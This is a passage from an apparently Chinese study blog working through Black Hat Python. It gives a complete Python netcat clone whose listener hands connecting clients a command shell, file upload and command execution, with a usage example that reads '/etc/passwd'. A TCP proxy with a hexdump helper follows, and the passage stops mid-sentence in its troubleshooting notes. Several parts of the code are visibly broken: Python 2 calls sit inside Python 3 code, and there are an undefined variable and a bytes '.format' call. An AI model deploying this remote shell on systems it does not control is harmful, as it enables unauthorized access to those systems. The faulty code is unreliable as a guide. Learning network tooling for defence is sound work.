<h3 id="应用："><a href="#应用：" class="headerlink" title="应用："></a>应用：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e:\Wing Personal 9&gt;python netcat.py -t localhost -p 5555</span><br><span class="line">^Z</span><br><span class="line">&lt;BHP:#&gt;</span><br><span class="line">input:</span><br><span class="line">dir</span><br><span class="line"> 驱动器 E 中的卷是 E</span><br><span class="line"> 卷的序列号是 28FF-7164</span><br><span class="line"></span><br><span class="line"> e:\Wing Personal 9 的目录</span><br><span class="line"></span><br><span class="line">2023/05/20  18:34    &lt;DIR&gt;          .</span><br><span class="line">2023/05/20  18:34    &lt;DIR&gt;          ..</span><br><span class="line">2023/05/13  20:18    &lt;DIR&gt;          bin</span><br><span class="line">2023/05/03  20:20    &lt;DIR&gt;          bootstrap</span><br><span class="line">2023/05/13  20:19    &lt;DIR&gt;          build-files</span><br><span class="line">2023/05/17  18:49         1,272,872 CATALOG.txt</span><br></pre></td></tr></table></figure>

<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys   <span class="comment">#Python解释器和运行时环境交互</span></span><br><span class="line"><span class="keyword">import</span> socket <span class="comment">#客户端与服务端连接</span></span><br><span class="line"><span class="keyword">import</span> getopt <span class="comment">#命令行选项解析模块</span></span><br><span class="line"><span class="keyword">import</span> threading <span class="comment">#多线程编程,并发执行、异步操作和线程间的协调与通信等</span></span><br><span class="line"><span class="keyword">import</span> subprocess <span class="comment">#用于创建和管理子进程的模块,执行外部命令、调用其他可执行文件，并与其进行交互和处理。</span></span><br><span class="line"><span class="keyword">import</span> chardet <span class="comment">#编码问题</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#全局变量</span></span><br><span class="line">listen =<span class="literal">False</span></span><br><span class="line">command=<span class="literal">False</span></span><br><span class="line">upload =<span class="literal">False</span></span><br><span class="line">upload_des=<span class="string">&quot;&quot;</span></span><br><span class="line">execute=<span class="string">&quot;&quot;</span></span><br><span class="line">target =<span class="string">&quot;&quot;</span></span><br><span class="line">port   =<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">usage</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;BHP Net Tool&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: netcat.py -t target_host -p port&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-l --listen          -listen on [host]:[port] for incoming connections&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-e  --execute=file_to_run -execute the given file upon receiving a connection&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-c --command     -initialize a command shell&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-u --upload_des  -upon receiving connection upload a file and write to [destination]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ep:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;netcat.py -t 192.168.0.1 -p 5555 -l -c&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;netcat.py -t 192.168.0.1 -p 5555 -l -e=\&quot;cat /etc/passwd\&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;echo &#x27;abcd&#x27; | ./netcat.py -t 192.168.0.1 -p 5555&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> upload_des</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:]):</span><br><span class="line">        usage()</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#2.读取命令行选项</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts,args=getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">&quot;hle:t:p:cu:&quot;</span>,</span><br><span class="line">                                [<span class="string">&quot;help&quot;</span>,<span class="string">&quot;listen&quot;</span>,<span class="string">&quot;execute&quot;</span>,<span class="string">&quot;target&quot;</span>,<span class="string">&quot;port&quot;</span>,<span class="string">&quot;command&quot;</span>,<span class="string">&quot;upload&quot;</span>])</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(err))</span><br><span class="line">        usage()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">&quot;-h&quot;</span>,<span class="string">&quot;--help&quot;</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;--listen&quot;</span>):</span><br><span class="line">            listen=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-e&quot;</span>,<span class="string">&quot;--excute&quot;</span>):</span><br><span class="line">            execute = a         </span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;--command&quot;</span>):</span><br><span class="line">            command=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--upload&quot;</span>):</span><br><span class="line">            upload_des=a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-t&quot;</span>,<span class="string">&quot;--target&quot;</span>):</span><br><span class="line">            target=a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-p&quot;</span>,<span class="string">&quot;--port&quot;</span>):</span><br><span class="line">            port=<span class="built_in">int</span>(a)</span><br><span class="line">          </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>,<span class="string">&quot;input wrong!&quot;</span></span><br><span class="line">    <span class="comment">#3.监听或 仅从标准输入发送数据</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> <span class="built_in">len</span>(target) <span class="keyword">and</span> port &gt;<span class="number">0</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#从命令行读取内存数据</span></span><br><span class="line">        <span class="comment">#阻塞，不向标准输入发送数据时，linux发送ctrl -d,windows ctrl z</span></span><br><span class="line">        buffer =sys.stdin.read()</span><br><span class="line">        <span class="comment">#发送数据</span></span><br><span class="line">        client_sender(buffer)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#4.监听并上传文件、执行命令</span></span><br><span class="line">    <span class="comment">#放置一个反弹shell</span></span><br><span class="line">    <span class="comment">#取决于上面的命令行选项</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">client_sender</span>(<span class="params">buffer</span>):</span><br><span class="line">    <span class="comment">#这个函数里要特别注意杜绝字节型字符串和普通字符串的拼接问题</span></span><br><span class="line">    <span class="comment">#且，网络发送的都是字节型字符串，注意编码解码</span></span><br><span class="line">    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#连接到目标主机</span></span><br><span class="line">        client.connect((target,port))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(buffer):</span><br><span class="line">            <span class="comment">#client.send(buffer)</span></span><br><span class="line">            client.send(buffer.encode(<span class="string">&#x27;utf-8&#x27;</span>))<span class="comment">#windows是默认gdk编码</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment">#等待数据回传</span></span><br><span class="line">            recv_len=<span class="number">1</span></span><br><span class="line">            response=<span class="string">&quot;&quot;</span></span><br><span class="line">          </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line">                </span><br><span class="line">                data=client.recv(<span class="number">4096</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#</span></span><br><span class="line">                recv_len=<span class="built_in">len</span>(data)</span><br><span class="line">                response+=data </span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> recv_len&lt;<span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(response)</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            <span class="comment">#等待更多输入</span></span><br><span class="line">            <span class="comment">#buffer=raw_input(&quot;&quot;)#python2用法</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">            buffer=<span class="built_in">input</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">            buffer+=<span class="string">&quot;\n&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送数据</span></span><br><span class="line">            client.send(buffer.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment">#print(&quot;[*] Exception! Exiting.&quot;)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*111] Exception: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment">#关闭连接</span></span><br><span class="line">        client.close()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_loop</span>():</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#若无目标，监听所有接口</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(target):</span><br><span class="line">        target=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">        </span><br><span class="line">    server =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target,port))</span><br><span class="line">    </span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket,addr=server.accept()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#分拆一个线程处理新的客户端</span></span><br><span class="line">        client_thread=threading.Thread(target=client_handler,</span><br><span class="line">        args=(client_socket,))</span><br><span class="line">        </span><br><span class="line">        client_thread.start()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_command</span>(<span class="params">command</span>):</span><br><span class="line">            </span><br><span class="line">    <span class="comment">#处理空格和换行</span></span><br><span class="line">    command=command.rstrip()</span><br><span class="line">    <span class="comment">#运行命令并将输出返回</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        command=command.decode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#先解码再执行</span></span><br><span class="line">        <span class="comment">#运行命令并返回输出</span></span><br><span class="line">        output=subprocess.check_output(command,stderr=subprocess.</span><br><span class="line">                                       STDOUT,shell=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment">#返回结果为系统shell默认编码的形式</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        </span><br><span class="line">        output = <span class="string">b&quot;Failed to execute command. Error: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(e))</span><br><span class="line">    <span class="comment">#发送输出</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">client_handler</span>(<span class="params">client_socket</span>):</span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#检测上传文件</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(upload_des):</span><br><span class="line">        <span class="comment">#读取所有字符并写下目标</span></span><br><span class="line">        file_buffer=<span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#持续读取直到没有符合的数据</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=client_socket.recv(<span class="number">1024</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer+=data</span><br><span class="line">        <span class="comment">#接收数据并写出来</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#file_descriptor=open(upload_des,&quot;wb&quot;)</span></span><br><span class="line">            <span class="comment">#file_descriptor.write(file_buffer)</span></span><br><span class="line">            <span class="comment">#file_descriptor.close()</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(upload_des,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file_descriptor:</span><br><span class="line">                file_descriptor.write(file_buffer)       </span><br><span class="line">            <span class="comment">#检查文件是否写出来了</span></span><br><span class="line">            </span><br><span class="line">            client_socket.send(<span class="built_in">str</span>.encode(<span class="string">&#x27;Successfully saved file to %s\r\n&#x27;</span> % upload_des))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="built_in">str</span>.encode(<span class="string">&#x27;Failed to save file to %s\r\n&#x27;</span> % upload_des))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#检查命令执行</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(execute):</span><br><span class="line">        <span class="comment">#运行命令</span></span><br><span class="line">        output=run_command(execute)</span><br><span class="line">        client_socket.send(output.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="comment">#命令行shell</span></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment">#弹出窗口</span></span><br><span class="line">            client_socket.send(<span class="string">b&quot;&lt;BHP:#&gt;&quot;</span>)</span><br><span class="line">            </span><br><span class="line">          </span><br><span class="line">            <span class="comment">#现在接收文件，直到发现换行符</span></span><br><span class="line">            cmd_buffer=<span class="string">&quot;&quot;</span></span><br><span class="line">            cmd_buffer=<span class="built_in">str</span>.encode(cmd_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">                cmd_buffer+=client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#返还命令输出</span></span><br><span class="line">            response=run_command(cmd_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#detect函数判断字节编码，按结果进行解码</span></span><br><span class="line">            btype=chardet.detect(response)</span><br><span class="line">            <span class="keyword">if</span> btype[<span class="string">&#x27;encoding&#x27;</span>]==<span class="string">&#x27;GB2312&#x27;</span>:</span><br><span class="line">                response=response.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">                response=<span class="built_in">str</span>.encode(response)</span><br><span class="line">            <span class="comment">#返回响应数据</span></span><br><span class="line">            client_socket.send(response)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>server_loop</code> 服务端主循环，接收客户端连接，返回客户端套接字</p>
<p><code>clent_sender</code> 连接服务端，首先检测是否已经从标准输入中接收数据，如果一切正常，就将数据发送给远程的目标主机并接受回传数据，知道没有更多的数据发送回来，然后再等待用户的下一步输入，并继续发送和接受数据，直到用户结束程序。</p>
<p><code>run_command()</code>:提供与客户端交互的方法，通过连接将命令结果回传到客户端。<br><code>client_handler()</code>:提供上传文件，执行命令，反弹shell的功能。</p>
<p>str.encode()将字符串编码为字节</p>
</blockquote>
<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://blog.csdn.net/qq_40549070/article/details/108193537?ops_request_misc=&request_id=&biz_id=102&utm_term=python%E9%BB%91%E5%B8%BD%E5%AD%90python3%E7%89%88%E6%9C%AC&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-108193537.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">python3代码实现(第二章)_快吃小蛋糕吧的博客-CSDN博客</a></p>
<h2 id="4-tcp代理"><a href="#4-tcp代理" class="headerlink" title="4.tcp代理"></a>4.tcp代理</h2><p>wireshark无法使用时，使用tcp代理了解未知协议。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">server_loop</span>(<span class="params">local_host,local_port,remote_host,remote_port,receive_first</span>):</span><br><span class="line">    </span><br><span class="line">    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server.bind((local_host,local_port))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!]Failed to listen on &#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(localhost,local_port))</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Listening on &#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(localhost,local_port))</span><br><span class="line">    </span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket,addr=server.accept()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#打印出本地连接信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[=&gt;]Received incming connection from &#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#开启一个线程与远程主机通信</span></span><br><span class="line">        proxy_thread=threading.Thread(target=proxy_handler,args=(client_socket,remote_host,remote_port,receive_first))</span><br><span class="line">        </span><br><span class="line">        proxy_thread.start()</span><br><span class="line">       </span><br></pre></td></tr></table></figure>

<p>服务端的监听函数，如果有新的请求，交给proxy_handler处理。</p>
<p>sys.argv[n] n&#x3D;0,1,2,3… 注意argv[0]是脚本名称，从1开始才是命令行参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:])!=<span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage:./tcpproxy.py [localhost][localport][remotehost][remoteport][receive_first]&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Example:./tcpproxy.py 127.0.0.1 9000 10.12.132.1 9000 True&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#设置本地监听参数</span></span><br><span class="line">    </span><br><span class="line">    local_host=sys.argv[<span class="number">1</span>]</span><br><span class="line">    local_port=<span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设置远程目标</span></span><br><span class="line">    remote_host=sys.argv[<span class="number">3</span>]</span><br><span class="line">    remote_port=<span class="built_in">int</span>(sys.argv[<span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#告知代理发送给远程主机之前连接和接收数据</span></span><br><span class="line">    receive_first=sys.argv[<span class="number">5</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;True&quot;</span> <span class="keyword">in</span> receive_first:</span><br><span class="line">        receive_first=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        receive_first=<span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="comment">#设置监听socket</span></span><br><span class="line">    server_loop(local_host,local_port,remote_host,remote_port,receive_first)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>主函数，没什么好说的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">proxy_handler</span>(<span class="params">client_socket,remote_host,remote_port,receive_first</span>):</span><br><span class="line">    <span class="comment">#连接远程主机</span></span><br><span class="line">    remote_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    remote_socket.connect((remote_host,remote_port))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#若需要从远程主机接收数据</span></span><br><span class="line">    <span class="keyword">if</span> receive_first:</span><br><span class="line">        remote_buffer=receive_from(remote_socket)</span><br><span class="line">        hexdump(remote_buffer)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#发送给响应处理</span></span><br><span class="line">        remote_buffer=response_handler(remote_buffer)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#若有数据传送给本地客户端，发送</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;====] Sending &#123;0&#125; bytes to localhost.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(remote_buffer)))</span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#本地循环读取数据，发送给远程主机和本地主机</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#从本地读取</span></span><br><span class="line">        local_buffer=receive_from(client_socket)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(local_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[===&gt;] Received &#123;0&#125; bytes from localhost&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(local_buffer)))</span><br><span class="line">            hexdump(local_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送给本地请求</span></span><br><span class="line">            local_buffer=request_handler(local_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送数据给远程主机</span></span><br><span class="line">            remote_socket.send(local_buffer)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[===&gt;]Sent to remote.&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#接收响应的数据</span></span><br><span class="line">        remote_buffer=receive_from(remote_socket)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;====]Received &#123;0&#125; bytes from remote.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(remote_buffer)))</span><br><span class="line">            hexdump(remote_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送到响应处理函数</span></span><br><span class="line">            remote_buffer=response_handler(remote_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#将响应给本地socket</span></span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;=====] Sent to localhost.&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment">#如果两边都没有数据，关闭连接</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(local_buffer) <span class="keyword">or</span> <span class="keyword">not</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            client_socket.close()</span><br><span class="line">            remote_socket.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]No more data.Closing connections.&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这就是<strong>代理</strong>的主体逻辑</p>
<blockquote>
<p>首先，先有个判断，不向远程主机主动发送数据。</p>
<p>然后receive_from()函数，它使用套接字对象实现对数据的接收</p>
<p>hexdump()转储数据包的负载内容</p>
<p>将收到的数据提交给<strong>response_hanlder</strong>，可以自行添加内容（如修改数据包内容，模糊测试、检测认证问题）</p>
<p>类似的<strong>request_handler</strong>函数，是将输出流量进行修改。</p>
<p>最后将接收到的缓存发送给本地客户端。</p>
<p>陆续从本地读取数据、处理、发送到远程主机、从远程读取数据、处理、发回本机。</p>
<p>.send()很好理解了，向谁发送，就用谁的套接字，如向本地发送，就client_socket.send()</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexdump</span>(<span class="params">src,length=<span class="number">16</span></span>): <span class="comment">#16进制导出函数</span></span><br><span class="line">    result=[]</span><br><span class="line">    digits= <span class="number">4</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(src,unicode) <span class="keyword">else</span> <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(src),length):</span><br><span class="line">        s=src[i:i+length]</span><br><span class="line">        hexa=<span class="string">b&#x27; &#x27;</span>.join([<span class="string">&quot;%0*X&quot;</span> %(digits,<span class="built_in">ord</span>(x)) <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line">        text=<span class="string">b&#x27; &#x27;</span>.join([x <span class="keyword">if</span> <span class="number">0x20</span> &lt;=<span class="built_in">ord</span>(x) &lt;<span class="number">0x7F</span> <span class="keyword">else</span> <span class="string">b&#x27;.&#x27;</span> <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line">        result.append(<span class="string">b&quot;%04X %-*s %s&quot;</span> % (i,length*(digits+<span class="number">1</span>),hexa,text))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&quot;&#x27;\n&#x27;.join(result)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_from</span>(<span class="params">connection</span>):</span><br><span class="line">    </span><br><span class="line">    buffer=<span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设置两秒的超时，取决于目标情况</span></span><br><span class="line">    connection.settimeout(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#持续从缓存中读取数据直到没有数据或超时</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=connection.recv(<span class="number">4096</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            buffer+=data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line"><span class="comment">#对目标是远程主机的请求进行修改</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_handler</span>(<span class="params">buffer</span>):</span><br><span class="line">    <span class="comment">#执行包修改</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"><span class="comment">#....本地主机的响应....</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response_handler</span>(<span class="params">buffer</span>):</span><br><span class="line">    <span class="comment">#执行包修改</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br></pre></td></tr></table></figure>

<p>hexdump的作用是仅输出数据包的十六进制值和可打印的ASCII</p>
<p>receive_from 接收本地和远程的数据</p>
<h3 id="错误整理"><a href="#错误整理" class="headerlink" title="错误整理"></a>错误整理</h3><p>这里我是widnows情况下，建了一个本地ftp服务器</p>
<p><code>python tcpproxy.py 127.0.0.1 5555 192.168.1.142 21 True</code></p>
<p>注意，因为建立ftp服务器已经占用了一个21端口，监听端口就不能再用21了。</p>
<p>之后需要打开终端</p>
<p><code>ftp 127.0.0.1 5555</code> 但是由于windows中没有指明端口的操作（默认为21端口）</p>
<p>(代理程序只是将数据流量转发给远程的 FTP 服务器，并不直接与 FTP 服务器通信。)</p>
<blockquote>
<p>连接127.0.0.1 5555</p>
</blockquote>
<p>代理程序出现</p>
